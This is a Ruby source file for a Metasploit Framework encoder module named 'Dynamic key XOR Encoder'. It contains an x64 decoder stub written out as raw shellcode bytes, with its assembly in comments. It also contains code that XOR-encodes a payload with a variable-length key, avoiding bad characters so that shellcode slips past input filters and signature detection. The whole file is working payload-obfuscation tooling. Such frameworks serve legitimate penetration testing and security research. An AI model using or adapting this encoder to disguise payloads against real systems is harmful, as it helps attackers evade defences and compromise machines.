##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Encoder

  def initialize
    super(
      'Name'             => 'Dynamic key XOR Encoder',
      'Description'      => 'An x64 XOR encoder with dynamic key size',
      'Author'           => [ 'lupman', 'phra' ],
      'Arch'             => ARCH_X64,
      'License'          => MSF_LICENSE,
      'EncoderType'      => Msf::Encoder::Type::Raw
      )
  end

  def minKeyLen
    Integer(datastore['KEYMIN'] || 0)
  end

  def maxKeyLen
    Integer(datastore['KEYMAX'] || 0)
  end

  def stub
    # jmp short _call
    # _ret:
    #   pop rcx
    #   mov rbx, rcx
    #   mov rsi, rbx
    # lp1:
    #   cmp byte [rcx], 'A'
    #   je _ok
    #   inc rcx
    #   jmp lp1
    # _ok:
    #   inc rcx
    #   mov rdi, rcx
    # lp:
    #   cmp word [rcx], 'BB'
    #   jz _jmp
    #   mov al, byte [rbx]
    #   xor byte [rcx], al
    #   inc rcx
    #   inc rbx
    #   cmp byte [rbx], 'A'
    #   jnz lp
    #   mov rbx, rsi
    #   jmp lp
    # _jmp:
    #   jmp rdi
    # _call:
    #   call _ret
    "\xeb\x34\x59\x48\x89\xcb\x48\x89\xde\x80\x39\x41\x74\x05\x48\xff\xc1\xeb\xf6\x48\xff\xc1\x48\x89\xcf\x66\x81\x39\x42\x42\x74\x14\x8a\x03\x30\x01\x48\xff\xc1\x48\xff\xc3\x80\x3b\x41\x75\xea\x48\x89\xf3\xeb\xe5\xff\xe7\xe8\xc7\xff\xff\xff"
  end

  def find_key(buf, badchars, keyChars)

    keyFound = nil

    bufLen = buf.length

    # Search for a valid key
    _minKeyLen = minKeyLen
    if _minKeyLen < 1
      _minKeyLen = Integer(buf.length / 100 * (0.2 + 0.05 * badchars.length))
      if _minKeyLen < 1
        _minKeyLen = 1
      end
    end

    _maxKeyLen = maxKeyLen
    if _maxKeyLen < 1
      _maxKeyLen = buf.length
    end

    for keyLen in _minKeyLen.._maxKeyLen do
      $stderr.print "\rKey size: #{keyLen}"
      $stderr.flush

      myKey = ""
      for x in 0..keyLen - 1 do
        keyChars.each_char do |j|
          ok = true
          i = 0
          while i + x < bufLen do
            if badchars[(buf[i + x].ord ^ j.ord).chr]
              ok = false
              break
            end

            i += keyLen
          end

          if ok
            myKey << j.chr
            break
          end

        end
      end

      if myKey.length == keyLen
        keyFound = myKey
        break
      end
    end

    $stderr.print "\n"
    $stderr.flush
    return keyFound
  end

  def encode(buf, badchars = nil, state = nil, platform = nil)

    # Set default badchars if empty
    badchars = "\x00\x0a\x0d" if (badchars == nil or badchars == '')

    # Check badchars in stub
    if Rex::Text.badchar_index(stub.gsub(/A/, "").gsub(/BB/, ""), badchars)
      raise EncodingError, "Bad character found in stub for the #{self.name} encoder.", caller
    end

    # Set allowed chars
    keyChars = ""
    for i in 1..255 do
      if !badchars[i.chr]
        keyChars << i.chr
      end
    end

    # Find key
    key = find_key(buf, badchars, keyChars)

    if key == nil
      raise NoKeyError, "A key could not be found for the #{self.name} encoder.", caller
    end

    # Search for key terminator
    keyTerm = nil
    keyChars.chars.shuffle.each do |i|
      if !key[i]
        keyTerm = i
        break
      end
    end

    if keyTerm == nil
      raise EncodingError, "Key terminator could not be found for the #{self.name} encoder.", caller
    end

    # Encode paylod
    pos = 0
    encoded = ""
    while pos < buf.length
      encoded << (buf[pos].ord ^ key[pos % key.length].ord).chr
      pos += 1
    end

    # Search for payload terminator
    payloadTerm = nil
    keyChars.chars.shuffle.each do |i|
      break unless keyChars.chars.shuffle.each do |j|
        if !encoded.index(i + j)
          payloadTerm = i + j
          break
        end
      end
    end

    if payloadTerm == nil
      raise EncodingError, "Payload terminator could not be found for the #{self.name} encoder.", caller
    end

    finalPayload = stub.gsub(/A/, keyTerm).gsub(/BB/, payloadTerm) + key + keyTerm + encoded + payloadTerm

    # Check badchars in finalPayload
    if Rex::Text.badchar_index(finalPayload, badchars)
     raise EncodingError, "Bad character found for the #{self.name} encoder.", caller
    end

    return finalPayload
  end
end
